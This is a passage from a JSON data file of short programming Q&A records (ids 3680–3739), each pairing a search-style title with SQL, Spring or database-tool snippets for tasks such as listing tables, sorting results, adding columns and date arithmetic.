    "description": "SELECT table_schema \"DB Name\",         ROUND(SUM(data_length + index_length) / 1024 / 1024, 1) \"DB Size in MB\"  FROM information_schema.tables  GROUP BY table_schema;  \nSELECT table_schema \"DB Name\",         ROUND(SUM(data_length + index_length) / 1024 / 1024, 1) \"DB Size in MB\"  FROM information_schema.tables  GROUP BY table_schema; \n",
    "reg_date": "2021-10-12T09:59:49.000Z"
  },
  {
    "id": 3680,
    "keyword": null,
    "link": null,
    "title": " show size of all tables postgres",
    "description": "select table_name, pg_relation_size(quote_ident(table_name)) from information_schema.tables where table_schema = 'public' order by 2\n",
    "reg_date": "2021-10-12T09:59:49.000Z"
  },
  {
    "id": 3681,
    "keyword": null,
    "link": null,
    "title": " show slave status mysql",
    "description": "SHOW SLAVE STATUS\n",
    "reg_date": "2021-10-12T09:59:49.000Z"
  },
  {
    "id": 3682,
    "keyword": null,
    "link": null,
    "title": " show sql server database",
    "description": "SELECT * FROM SYS.DATABASES\nEXEC sp_databases\nSELECT * FROM SYS.SYSDATABASES\nSELECT name FROM master.SYS.DATABASES\n",
    "reg_date": "2021-10-12T09:59:50.000Z"
  },
  {
    "id": 3683,
    "keyword": null,
    "link": null,
    "title": " show table columns",
    "description": "-- MySQL DESCRIBE tableName; SHOW COLUMNS FROM tableName;  -- SQLite3 .schema tableName\nDESCRIBE table1;  -- result: +----------------------+---------------------------+------+-----+-------------------+ | Field                | Type                      | Null | Key | Default           | Extra                                         | +----------------------+---------------------------+------+-----+-------------------+ | film_id              | smallint(5) unsigned      | NO   |     | 0                 |                                               | | title                | varchar(128)              | NO   |     | NULL              |                                               | | description          | text                      | YES  |     | NULL              |                                               | | release_year         | year(4)                   | YES  |     | NULL              |                                               | | language_id          | tinyint(3) unsigned       | NO   |     | NULL              |                                               | | original_language_id | tinyint(3) unsigned       | YES  |     | NULL              |                                               | | rental_duration      | tinyint(3) unsigned       | NO   |     | 3                 |                                               | | rental_rate          | decimal(4,2)              | NO   |     | 4.99              |\n",
    "reg_date": "2021-10-12T09:59:50.000Z"
  },
  {
    "id": 3684,
    "keyword": null,
    "link": null,
    "title": " show table columns mysql command line",
    "description": "SHOW COLUMNS from tablename;\nSELECT COLUMN_NAME   FROM INFORMATION_SCHEMA.COLUMNS   WHERE TABLE_SCHEMA = 'my_database' AND TABLE_NAME = 'my_table'; \nDESCRIBE my_table; \n",
    "reg_date": "2021-10-12T09:59:50.000Z"
  },
  {
    "id": 3685,
    "keyword": null,
    "link": null,
    "title": " show table details postgresql",
    "description": "\\d table\n",
    "reg_date": "2021-10-12T09:59:50.000Z"
  },
  {
    "id": 3686,
    "keyword": null,
    "link": null,
    "title": " show table info mysql",
    "description": "show tables; \nCopied mysql> DESCRIBE pet; +---------+-------------+------+-----+---------+-------+ | Field   | Type        | Null | Key | Default | Extra | +---------+-------------+------+-----+---------+-------+ | name    | varchar(20) | YES  |     | NULL    |       | | owner   | varchar(20) | YES  |     | NULL    |       | | species | varchar(20) | YES  |     | NULL    |       | | sex     | char(1)     | YES  |     | NULL    |       | | birth   | date        | YES  |     | NULL    |       | | death   | date        | YES  |     | NULL    |       | +---------+-------------+------+-----+---------+-------+\nPress CTRL+C to copy SHOW [EXTENDED] [FULL] TABLES     [{FROM | IN} db_name]     [LIKE 'pattern' | WHERE expr]\n",
    "reg_date": "2021-10-12T09:59:50.000Z"
  },
  {
    "id": 3687,
    "keyword": null,
    "link": null,
    "title": " show table mysql",
    "description": "show tables; \nDESCRIBE table_name; # To show table structure...\nSHOW TABLES;\nDESCRIBE my_table; \nCopied mysql> SHOW CREATE TABLE t\\G *************************** 1. row ***************************        Table: t Create Table: CREATE TABLE `t` (   `id` int(11) NOT NULL AUTO_INCREMENT,   `s` char(60) DEFAULT NULL,   PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4\n# First, select your database USE yourDb;  # Then, simply SHOW TABLES;\n",
    "reg_date": "2021-10-12T09:59:50.000Z"
  },
  {
    "id": 3688,
    "keyword": null,
    "link": null,
    "title": " show table postgres command",
    "description": "PostgreSQL show tables command \t \\dt\npostgres=# \\d tablename;\n\\d table\n",
    "reg_date": "2021-10-12T09:59:50.000Z"
  },
  {
    "id": 3689,
    "keyword": null,
    "link": null,
    "title": " show table status command in mysql",
    "description": "SHOW TABLE STATUS FROM DB_name WHERE name = 'table_name';\n",
    "reg_date": "2021-10-12T09:59:50.000Z"
  },
  {
    "id": 3690,
    "keyword": null,
    "link": null,
    "title": " show table structure mysql console",
    "description": "use DATABASE_NAME; describe TABLE_NAME;\n",
    "reg_date": "2021-10-12T09:59:50.000Z"
  },
  {
    "id": 3691,
    "keyword": null,
    "link": null,
    "title": " show tables mysql",
    "description": "show tables; \nDESCRIBE table_name; # To show table structure...\nSHOW TABLES;\n# First, select your database USE yourDb;  # Then, simply SHOW TABLES;\nCopied mysql> DESCRIBE pet; +---------+-------------+------+-----+---------+-------+ | Field   | Type        | Null | Key | Default | Extra | +---------+-------------+------+-----+---------+-------+ | name    | varchar(20) | YES  |     | NULL    |       | | owner   | varchar(20) | YES  |     | NULL    |       | | species | varchar(20) | YES  |     | NULL    |       | | sex     | char(1)     | YES  |     | NULL    |       | | birth   | date        | YES  |     | NULL    |       | | death   | date        | YES  |     | NULL    |       | +---------+-------------+------+-----+---------+-------+\nPress CTRL+C to copy SHOW [EXTENDED] [FULL] TABLES     [{FROM | IN} db_name]     [LIKE 'pattern' | WHERE expr]\n",
    "reg_date": "2021-10-12T09:59:51.000Z"
  },
  {
    "id": 3692,
    "keyword": null,
    "link": null,
    "title": " show tables sql server",
    "description": "USE YOUR_DATABASE_NAME SELECT * FROM INFORMATION_SCHEMA.TABLES\nSELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nShowing all table:  show tables;  Showing table data: SELECT * or column_names FROM table_name;\nBY LOVE SINGH on May 19 2020  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\n",
    "reg_date": "2021-10-12T09:59:51.000Z"
  },
  {
    "id": 3693,
    "keyword": null,
    "link": null,
    "title": " show the colums of table sql",
    "description": "SHOW COLUMNS FROM table_name;  or   DESCRIBE table_name;\n",
    "reg_date": "2021-10-12T09:59:51.000Z"
  },
  {
    "id": 3694,
    "keyword": null,
    "link": null,
    "title": " show users",
    "description": "//To show all data use following query select * from mysql.user; // To show user and host use following query select User,Host from mysql.user;\nmysql> select host, user, password from mysql.user; \nmysql> select * from mysql.user; \nSELECT User,Host FROM mysql.user; DROP USER 'testuser'@'localhost';\n",
    "reg_date": "2021-10-12T09:59:51.000Z"
  },
  {
    "id": 3695,
    "keyword": null,
    "link": null,
    "title": " simple project for database",
    "description": "***Top SQL Project Ideas For Beginners***  1. Library Management System.  2. Centralized College Database.  3. Student Database Management.  4. Online Retail Application Database.  5. Inventory Control Management.  6. Hospital Management System. 7. Railway System Database.  8. Payroll Management System. 9. An SMS-based Remote Server Monitoring System. 10. Blood Donation Database.\n",
    "reg_date": "2021-10-12T09:59:51.000Z"
  },
  {
    "id": 3696,
    "keyword": null,
    "link": null,
    "title": " size of all tables in a schema oracle",
    "description": "SELECT sum(BYTES) / 1e6 AS SIZE_MB FROM DBA_SEGMENTS WHERE OWNER = 'schema_name'; -- By type SELECT SEGMENT_TYPE, sum(BYTES) / 1e6 AS SIZE_MB FROM DBA_SEGMENTS     WHERE OWNER = 'schema_name' GROUP BY SEGMENT_TYPE; -- By schema SELECT OWNER, sum(BYTES) / 1e6 AS SIZE_MB FROM DBA_SEGMENTS GROUP BY OWNER     ORDER BY SIZE_MB DESC;\n-- Oracle: Size of a table in a tablespace SELECT     e.owner,     e.segment_name,     e.tablespace_name,     SUM(e.bytes) / 1048576 megs FROM dba_extents e WHERE     e.owner = 'xxMY_OWNERxx'     AND e.tablespace_name = 'xxMY_TBSxx'     AND e.segment_name = 'xxMY_TABLExx' GROUP BY e.owner, e.segment_name, e.tablespace_name ORDER BY     e.tablespace_name,     e.segment_name;\n",
    "reg_date": "2021-10-12T09:59:51.000Z"
  },
  {
    "id": 3697,
    "keyword": null,
    "link": null,
    "title": " snap craft",
    "description": "sudo snap install mysql-workbench-community\n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3698,
    "keyword": null,
    "link": null,
    "title": " snowflake alter column data type",
    "description": "alter table TABLE_NAME add column TEMP_COLUMN TIMESTAMP_LTZ(9);  update TABLE_NAME t1   set t1.TEMP_COLUMN = TO_TIMESTAMP_LTZ(t2.TIMESTAMP_NTZ_COLUMN_NAME)   from TABLE_NAME t2   where t1.TEMP_COLUMN = t2.TIMESTAMP_NTZ_COLUMN_NAME  // if you don't want troubles create a new copy of table and use SWAP WITH instead alter table aws_config rename column TIMESTAMP_NTZ_COLUMN_NAME to TIMESTAMP_NTZ_COLUMN_NAME_OLD; alter table aws_config rename column TEMP_COLUMN to TIMESTAMP_NTZ_COLUMN_NAME;  alter table aws_config drop column TIMESTAMP_NTZ_COLUMN_NAME_OLD\nalter table t1 alter c4 set data type varchar(50)\n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3699,
    "keyword": null,
    "link": null,
    "title": " snowflake rename column name",
    "description": "ALTER TABLE <table_name> RENAME COLUMN <col_name> TO <new_col_name>\n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3700,
    "keyword": null,
    "link": null,
    "title": " sometimes i cant edit sql developer",
    "description": "It sounds like your accelerators might be confused and it no longer knows that the Backspace is the delete previous character key (the key mapping seems to get confused ocassionally). Go to Tools > Preferences > Accelerators and select \"Delete Previous Char\" in the Actions list and see if there is anything in the Accelerators on the right. If not, you can revert to the standard accelerators (which tends to fix the problem) by selecting the \"Load Preset ...\" button.\n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3701,
    "keyword": null,
    "link": null,
    "title": " soql  more than today",
    "description": "SELECT Date__c FROM Object__c WHERE Date__c < TODAY ORDER BY Date__c DESC LIMIT 1 \n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3702,
    "keyword": null,
    "link": null,
    "title": " soql last week",
    "description": "Select * from case where WHERE CreatedDate = LAST_N_DAYS:30\n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3703,
    "keyword": null,
    "link": null,
    "title": " sort by mysql",
    "description": "SELECT column_name(s) FROM table_name ORDER BY column_name(s) ASC|DESC \nSELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t\t-- col1 DESC then col2 ASC\n    SELECT     column_name1, column_name2, column_name3 FROM     table_name ORDER BY     column_name1 [ASC|DESC],     column_name2 [ASC|DESC],    ...;\nTo get the sorted result from MySQL select statement we use order by clause with SELECT statement.  Syntax: SELECT column_list FROM tablename ORDER BY column_name1 [ASC][DESC],column_name2 [ASC][DESC],...\nSELECT     select_list FROM     table_name ORDER BY     column1 [ASC|DESC],     column2 [ASC|DESC],    ...;\nSELECT * FROM adminra_RepAda.customerServiceRequests order by insertDate DESC;\n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3704,
    "keyword": null,
    "link": null,
    "title": " sort by sql",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t \t-- col1 DESC then col2 ASC\n//this_for_descending_order..   SELECT * FROM TableName ORDER BY columnName DESC;  // this_for_ascending_order.. SELECT * FROM TableName ORDER BY columnName ASC;\nSELECT q.*      FROM (SELECT TOP 3 *                FROM table                ORDER BY id DESC) q     ORDER BY q.id ASC\nSELECT * FROM employees ORDER BY employees.employee_id DESC ; &middot;        Ascending ( ASC) &middot;        Descending ( DESC)\nSQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nUsed to sort the result data in ascending (default) or descending order through the use of ASC or DESC keywords. Example: Returns countries in alphabetical order. SELECT * FROM countries ORDER BY name;\n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3705,
    "keyword": null,
    "link": null,
    "title": " sort order on two columns sql",
    "description": "Sort by multiple column : ORDER BY column1 DESC, column2\n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3706,
    "keyword": null,
    "link": null,
    "title": " space not removing from column in sql",
    "description": "update thetable set thecolumn = rtrim(replace(thecolumn, char(160), char(32))) \n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3707,
    "keyword": null,
    "link": null,
    "title": " spark sql concatenate string and int",
    "description": "select concat('01/01/', extract(year from current_timestamp()) - 5) select concat('01/01/', 2020)\n",
    "reg_date": "2021-10-12T09:59:52.000Z"
  },
  {
    "id": 3708,
    "keyword": null,
    "link": null,
    "title": " spark sql convert string to date",
    "description": "spark.sql(\"\"\"   SELECT TO_DATE(CAST(UNIX_TIMESTAMP('12/31/2049', 'MM/dd/yyyy') AS TIMESTAMP)) AS newdate\"\"\" ).show()\n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3709,
    "keyword": null,
    "link": null,
    "title": " sparql list all graphs",
    "description": "SELECT ?g  WHERE {   GRAPH ?g { } }\n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3710,
    "keyword": null,
    "link": null,
    "title": " specific date format oracle",
    "description": "TO_CHAR (TO_DATE('0297','MM/YY'), 'MM/YY') \n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3711,
    "keyword": null,
    "link": null,
    "title": " split first name and last name in sql",
    "description": "# Name of table = names_table # Name of column containing names = full_name # Simply change the table and column name to what corresponds with your dataset  SELECT LEFT(full_name, STRPOS(primary_poc, ' ') -1 ) AS first_name,     \t\tRIGHT(full_name, LENGTH(primary_poc) - STRPOS(primary_poc, ' ')) AS last_name, name FROM names_table;  # NB: This does not capture middle names\n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3712,
    "keyword": null,
    "link": null,
    "title": " split string by comma in sql server",
    "description": "CREATE FUNCTION Split (   @delimited nvarchar(max),   @delimiter nvarchar(100) ) RETURNS @t TABLE ( -- Id column can be commented out, not required for sql splitting string   id int identity(1,1), -- I use this column for numbering splitted parts   val nvarchar(max) ) AS BEGIN   declare @xml xml   set @xml = N'<root><r>' + replace(@delimited,@delimiter,'</r><r>') + '</r></root>'    insert into @t(val)   select     r.value('.','varchar(max)') as item   from @xml.nodes('//root/r') as records(r)    RETURN END GO\n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3713,
    "keyword": null,
    "link": null,
    "title": " spring boot mysql connection properties",
    "description": "spring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3714,
    "keyword": null,
    "link": null,
    "title": " spring import sql",
    "description": "-- You can simply create a data.sql file in your src/main/resources folder  -- and it will be automatically executed on startup.  -- In this file you just add some insert statements, eg.:  INSERT INTO users (username, firstname, lastname) VALUES   ('lala', 'lala', 'lala'),   ('lolo', 'lolo', 'lolo');    -- If you're using Spring boot 2, database initialization only works for  -- embedded databases (H2, HSQLDB, ...). If you want to use it for other  -- databases as well, you need to change the  -- spring.datasource.initialization-mode property:  spring.datasource.initialization-mode=always \n-- You can simply create a data.sql file in your src/main/resources folder  -- and it will be automatically executed on startup.  -- In this file you just add some insert statements, eg.:  INSERT INTO users (username, firstname, lastname) VALUES   ('lala', 'lala', 'lala'),   ('lolo', 'lolo', 'lolo');    -- If you're using Spring boot 2, database initialization only works for  -- embedded databases (H2, HSQLDB, ...). If you want to use it for other  -- databases as well, you need to change the  -- spring.datasource.initialization-mode property:  spring.datasource.initialization-mode=always\n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3715,
    "keyword": null,
    "link": null,
    "title": " spring postgresql reset auto increment to 0",
    "description": "ALTER SEQUENCE product_id_seq RESTART WITH 1453\n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3716,
    "keyword": null,
    "link": null,
    "title": " spring where to put the data sql",
    "description": "-- You can simply create a data.sql file in your src/main/resources folder  -- and it will be automatically executed on startup.  -- In this file you just add some insert statements, eg.:  INSERT INTO users (username, firstname, lastname) VALUES   ('lala', 'lala', 'lala'),   ('lolo', 'lolo', 'lolo');    -- If you're using Spring boot 2, database initialization only works for  -- embedded databases (H2, HSQLDB, ...). If you want to use it for other  -- databases as well, you need to change the  -- spring.datasource.initialization-mode property:  spring.datasource.initialization-mode=always \n-- You can simply create a data.sql file in your src/main/resources folder  -- and it will be automatically executed on startup.  -- In this file you just add some insert statements, eg.:  INSERT INTO users (username, firstname, lastname) VALUES   ('lala', 'lala', 'lala'),   ('lolo', 'lolo', 'lolo');    -- If you're using Spring boot 2, database initialization only works for  -- embedded databases (H2, HSQLDB, ...). If you want to use it for other  -- databases as well, you need to change the  -- spring.datasource.initialization-mode property:  spring.datasource.initialization-mode=always\n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3717,
    "keyword": null,
    "link": null,
    "title": " sql: extract day text from datetime value",
    "description": "SELECT DATENAME(dw,'09/23/2013') as theDayName  \n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3718,
    "keyword": null,
    "link": null,
    "title": " sql COLLATE",
    "description": "-- set language USE master; GO ALTER DATABASE [M9_SAS_5.1.6_liquid] COLLATE French_CI_AS ; GO   -- Verify the collation setting. SELECT name, collation_name FROM sys.databases WHERE name = N'DB_name'; GO  -- you can also need to change your user's property ALTER LOGIN <SEU_LOGIN> WITH DEFAULT_LANGUAGE = Fran&ccedil;ais\n",
    "reg_date": "2021-10-12T09:59:53.000Z"
  },
  {
    "id": 3719,
    "keyword": null,
    "link": null,
    "title": " sql DATE = GETDATE()",
    "description": "CAST(GETDATE() AS DATE)\n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3720,
    "keyword": null,
    "link": null,
    "title": " sql What type is that value?",
    "description": "SELECT TYPEOF(value);\n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3721,
    "keyword": null,
    "link": null,
    "title": " sql  online compiler",
    "description": "This is a good SQL editor: https://www.tutorialspoint.com/execute_sql_online.php\n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3722,
    "keyword": null,
    "link": null,
    "title": " sql  table",
    "description": "CREATE TABLE utilisateur (     id INT PRIMARY KEY NOT NULL,     nom VARCHAR(100),     prenom VARCHAR(100),     email VARCHAR(255),     date_naissance DATE,     pays VARCHAR(255),     ville VARCHAR(255),     code_postal VARCHAR(5),     nombre_achat INT )\n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3723,
    "keyword": null,
    "link": null,
    "title": " sql access UPDATE",
    "description": "--update query example  UPDATE table_name  SET column1 = value1, column2 = value2, ...  WHERE condition; \nUPDATE Orders SET OrderAmount = OrderAmount * 1.1, Freight = Freight * 1.03  WHERE ShipCountry = 'UK'; \n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3724,
    "keyword": null,
    "link": null,
    "title": " sql add",
    "description": "--sql insert quest example INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); \nINSERT INTO Customer (FirstName, LastName, City, Country, Phone) VALUES ('Craig', 'Smith', 'New York', 'USA', 1-01-993 2800)\nAdds a new column to an existing table. Example: Adds a new column named &lsquo;email_address&rsquo; to a table named &lsquo;users&rsquo;. ALTER TABLE users ADD email_address varchar(255);\nINSERT INTO users (first_name, last_name, address, email) VALUES (&lsquo;Tester&rsquo;, &lsquo;Jester&rsquo;, &lsquo;123 Fake Street, Sheffield, United Kingdom&rsquo;, &lsquo;test@lukeharrison.dev&rsquo;);\n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3725,
    "keyword": null,
    "link": null,
    "title": " sql add column",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name datatype;  --example ALTER TABLE Customers ADD Email varchar(255);\nALTER TABLE table_name ADD column_name varchar(50);\nALTER TABLE table_name  ALTER COLUMN column_name new_data_type(size); \nALTER TABLE table_name ADD column_name datatype;\nALTER TABLE table ADD COLUMN column VARCHAR (255) NOT NULL AFTER column;\n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3726,
    "keyword": null,
    "link": null,
    "title": " sql add column after another",
    "description": "ALTER TABLE myTable ADD myNewColumn VARCHAR(255) AFTER myOtherColumn \n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3727,
    "keyword": null,
    "link": null,
    "title": " sql add column with default value",
    "description": "ALTER TABLE users ADD visit_number INT DEFAULT 0;\nALTER TABLE Protocols ADD ProtocolTypeID int NOT NULL DEFAULT(1)\nALTER TABLE PERSON ADD IS_ACTIVE VARCHAR2(1) DEFAULT 'N' NOT NULL\nALTER TABLE {TABLENAME}  ADD {COLUMNNAME} {TYPE} {NULL|NOT NULL}  CONSTRAINT {CONSTRAINT_NAME} DEFAULT {DEFAULT_VALUE} WITH VALUES \nALTER TABLE SomeTable         ADD SomeCol Bit NULL --Or NOT NULL.  CONSTRAINT D_SomeTable_SomeCol --When Omitted a Default-Constraint Name is autogenerated.     DEFAULT (0)--Optional Default-Constraint. WITH VALUES --Add if Column is Nullable and you want the Default Value for Existing Records.\nALTER TABLE {TABLENAME}  ADD {COLUMNNAME} {TYPE} {NULL|NOT NULL}  CONSTRAINT {CONSTRAINT_NAME} DEFAULT {DEFAULT_VALUE} WITH VALUES  example   ALTER TABLE SomeTable         ADD SomeCol Bit NULL --Or NOT NULL.  CONSTRAINT D_SomeTable_SomeCol --When Omitted a Default-Constraint Name is autogenerated.     DEFAULT (0)--Optional Default-Constraint. WITH VALUES --Add if Column is Nullable and you want the Default Value for Existing Records. \n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3728,
    "keyword": null,
    "link": null,
    "title": " sql add days to date",
    "description": "//Returns Date time //Takes where to add (as in year, month, day, etc) to //Takes how much to add //Takes a datetime in some different formats DATEADD(day, 1, '2017/08/25') \nUPDATE classes  SET `date` = DATE_ADD(`date`, INTERVAL 2 DAY) WHERE id = 161\nSELECT GETDATE() 'Today',             DATEADD(day,-2,GETDATE()) 'Today - 2 Days' SELECT GETDATE() 'Today',             DATEADD(dd,-2,GETDATE()) 'Today - 2 Days' SELECT GETDATE() 'Today',             DATEADD(d,-2,GETDATE()) 'Today - 2 Days' \nDATEADD(HOUR, 2, GETUTCDATE())\nUPDATE classes  SET `date` = DATE_ADD(`date` , INTERVAL 2 DAY) WHERE `id` = 161;\nSELECT GETDATE() - 1\n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3729,
    "keyword": null,
    "link": null,
    "title": " sql add index",
    "description": " CREATE INDEX index_name  ON table_name (column1, column2, ...); \n",
    "reg_date": "2021-10-12T09:59:54.000Z"
  },
  {
    "id": 3730,
    "keyword": null,
    "link": null,
    "title": " sql add months to date",
    "description": "UPDATE users SET date = DATEADD(MONTH, 1, date) \n//Returns Date time //Takes where to add (as in year, month, day, etc) to //Takes how much to add //Takes a datetime in some different formats DATEADD(month, 1, '2017/08/25') \nSELECT GETDATE() 'Today',             DATEADD(day,-2,GETDATE()) 'Today - 2 Days' SELECT GETDATE() 'Today',             DATEADD(dd,-2,GETDATE()) 'Today - 2 Days' SELECT GETDATE() 'Today',             DATEADD(d,-2,GETDATE()) 'Today - 2 Days' \nUPDATE users SET date = DATE_ADD(date, INTERVAL 1 month ) \nUPDATE users SET date = ADD_MONTHS(date, 1) \n",
    "reg_date": "2021-10-12T09:59:55.000Z"
  },
  {
    "id": 3731,
    "keyword": null,
    "link": null,
    "title": " sql add statement access",
    "description": "INSERT INTO tblProducts (ProductName,    CategoryDescription, UnitPrice) VALUES ('Support Renewal', 'Multi-User', 99); \nPARAMETERS LastDateToKeep DateTime; INSERT INTO tblContactEventsHistory   (ContactID, ContactDateTime, ContactEventType, ContactNotes )  SELECT tblContactEvents.ContactID, tblContactEvents.ContactDateTime,    tlkpContactEventTypes.ContactEventTypeDescription,    tblContactEvents.ContactNotes   FROM tlkpContactEventTypes   INNER JOIN (tblContactEvents    LEFT JOIN tblContactEventsHistory    ON (tblContactEvents.ContactID = tblContactEventsHistory.ContactID)     AND (tblContactEvents.ContactDateTime =      tblContactEventsHistory.ContactDateTime))   ON tlkpContactEventTypes.ContactEventTypeID =    tblContactEvents.ContactEventTypeID  WHERE (tblContactEvents.ContactDateTime<[LastDateToKeep])   AND (tblContactEventsHistory.ContactID Is Null); \n",
    "reg_date": "2021-10-12T09:59:55.000Z"
  },
  {
    "id": 3732,
    "keyword": null,
    "link": null,
    "title": " sql add two values together",
    "description": "SELECT  ID, SUM(VALUE1 + VALUE2) FROM    tableName GROUP   BY ID  --or simple addition  SELECT \tID, \t(VALUE1 + VALUE2) as AddedValues FROM tableName\n",
    "reg_date": "2021-10-12T09:59:55.000Z"
  },
  {
    "id": 3733,
    "keyword": null,
    "link": null,
    "title": " sql add year to date",
    "description": "//Returns Date time //Takes where to add (as in year, month, day, etc) to //Takes how much to add //Takes a datetime in some different formats DATEADD(year, 1, '2017/08/25') \nSELECT GETDATE() 'Today',             DATEADD(day,-2,GETDATE()) 'Today - 2 Days' SELECT GETDATE() 'Today',             DATEADD(dd,-2,GETDATE()) 'Today - 2 Days' SELECT GETDATE() 'Today',             DATEADD(d,-2,GETDATE()) 'Today - 2 Days' \n",
    "reg_date": "2021-10-12T09:59:55.000Z"
  },
  {
    "id": 3734,
    "keyword": null,
    "link": null,
    "title": " sql aggregate functions",
    "description": " -- Emp_Id is a Column Name  -- employee_tble is Table Name;   select count(Emp_Id) from employee_tbl;  select min(Salary) from employee_tbl;  select max(Salary) from employee_tbl;  select sum(Salary) from employee_tbl;  select avg(Salary) from employee_tbl;\nSELECT COUNT(*) FROM dbo.bigTransactionHistory; \nThe following are the most commonly used SQL aggregate functions: AVG &ndash; calculates the average of a set of values. COUNT &ndash; counts rows in a specified table or view. MIN &ndash; gets the minimum value in a set of values. MAX &ndash; gets the maximum value in a set of values. SUM &ndash; calculates the sum of values.  The following illustrates the syntax of an aggregate function: aggregate_function_name(DISTINCT | ALL expression)  In this syntax;  First, specify the name of an aggregate function that you want to use such as AVG, SUM, and MAX. Second, use DISTINCT if you want only distinct values are considered in the calculation or ALL if all values are considered in the calculation. By default, ALL is used if you don&rsquo;t specify any modifier. Third, the expression can be a column of a table or an expression that consists of multiple columns with arithmetic operators.  \nMAX &ndash; To find the number of the maximum values in the SQL table.  MIN &ndash; Number of the minimum values in the table.  COUNT &ndash; Get the number of count values in the SQL table.  AVG &ndash; Find average values in the SQL table.  SUM &ndash;  Return the summation of all non-null values in the SQL table.\n--- GROUP FUNCTION | MULTI ROW FUNCTION | AGGREGATE FUNCTION  --- COUNT , MAX , MIN , SUM , AVG\n--- GROUP FUNCTION | MULTI ROW FUNCTION | AGGREGATE FUNCTION  --- COUNT , MAX , MIN , SUM , AVG \n",
    "reg_date": "2021-10-12T09:59:55.000Z"
  },
  {
    "id": 3735,
    "keyword": null,
    "link": null,
    "title": " sql alchemy or",
    "description": "from sqlalchemy import or_ filter(or_(User.name == 'ed', User.name == 'wendy'))\n",
    "reg_date": "2021-10-12T09:59:55.000Z"
  },
  {
    "id": 3736,
    "keyword": null,
    "link": null,
    "title": " sql alchemy with azuresql server",
    "description": "print(engine_azure.table_names())\n",
    "reg_date": "2021-10-12T09:59:55.000Z"
  },
  {
    "id": 3737,
    "keyword": null,
    "link": null,
    "title": " sql alias",
    "description": "UPDATE t SET t.COLUMN = 'UPDATE' FROM DATABASE_TABLE t WHERE t.ID = 1;\n-- SELECT my_col_name AS my_alias FROM my_table; SELECT sysdate() AS \"Current date\";   \t\t\t-- MySQl Alias SELECT sysdate AS \"Current date\" FROM dual;   \t-- same in Oracle\nALIAS command in SQL is the name that  can be given to any table or a column. This alias name can be referred in WHERE clause to identify a particular table or a column.\n",
    "reg_date": "2021-10-12T09:59:55.000Z"
  },
  {
    "id": 3738,
    "keyword": null,
    "link": null,
    "title": " sql all",
    "description": "Returns true if any of the subquery values meet the given condition. Example: Returns products from the products table which have received orders &ndash; stored in the orders table &ndash; with a quantity of more than 5. SELECT name FROM products WHERE productId = ANY (SELECT productId FROM orders WHERE quantity > 5);\nReturns true if all of the subquery values meet the passed condition. Example: Returns the users with a higher number of tasks than the user with the highest number of tasks in the HR department (id 2) SELECT first_name, surname, tasks_no FROM users WHERE tasks_no > ALL (SELECT tasks FROM user WHERE department_id = 2);\n",
    "reg_date": "2021-10-12T09:59:55.000Z"
  },
  {
    "id": 3739,
    "keyword": null,
    "link": null,
    "title": " sql all columns",
